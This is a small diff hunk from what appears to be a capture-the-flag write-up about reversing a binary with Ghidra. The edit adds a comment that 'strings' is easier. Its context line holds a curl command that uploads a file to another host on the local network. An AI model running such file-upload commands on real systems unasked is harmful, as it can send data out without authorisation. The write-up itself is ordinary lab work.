@@ -431,7 +431,7 @@ What is the password?
 
 Send it to my machine using curl : curl -X POST -F "files=@hackernews" http://192.168.1.108:8000/upload
 
-I starting doing some reversing using ghidra
+I starting doing some reversing using ghidra //easist way is using strings
 
 Main
 
